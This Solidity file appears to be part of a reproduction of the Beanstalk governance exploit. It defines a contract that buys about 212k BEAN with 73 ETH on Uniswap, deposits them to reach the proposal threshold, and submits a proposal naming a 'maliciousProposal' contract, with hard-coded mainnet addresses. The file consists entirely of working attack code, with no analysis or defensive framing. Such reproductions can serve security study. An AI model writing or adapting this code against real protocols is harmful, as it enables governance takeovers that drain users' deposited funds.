// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import './BeanstalkExploiter.sol';

// Proposal tx hash: 0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f
contract BeanstalkProposer {
    IBeanstalk private constant BEANSTALK_PROTOCOL = IBeanstalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IRouter private constant UNISWAPV2 = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like private constant BEAN = IERC20Like(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);

    address private immutable maliciousProposal;

    constructor(address _proposal) {
        maliciousProposal = _proposal;

        BEAN.approve(address(BEANSTALK_PROTOCOL), type(uint256).max);
    }

    function propose() external {
        // Swap 73 ETH for BEAN for ~212k BEAN and deposit into protocol (about 0.2% of total supply, which exceeds
        // 0.1% threshold needed to propose a BIP)
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(BEAN);
        UNISWAPV2.swapExactETHForTokens{value: 73 ether}(200_000e6, path, address(this), block.timestamp + 300);

        BEANSTALK_PROTOCOL.depositBeans(BEAN.balanceOf(address(this)));

        IDiamondCut.FacetCut[] memory facet = new IDiamondCut.FacetCut[](0); // empty
        bytes memory data = hex"e1c7392a"; // selector for init() 
        BEANSTALK_PROTOCOL.propose(facet, maliciousProposal, data, 3);
   }
}
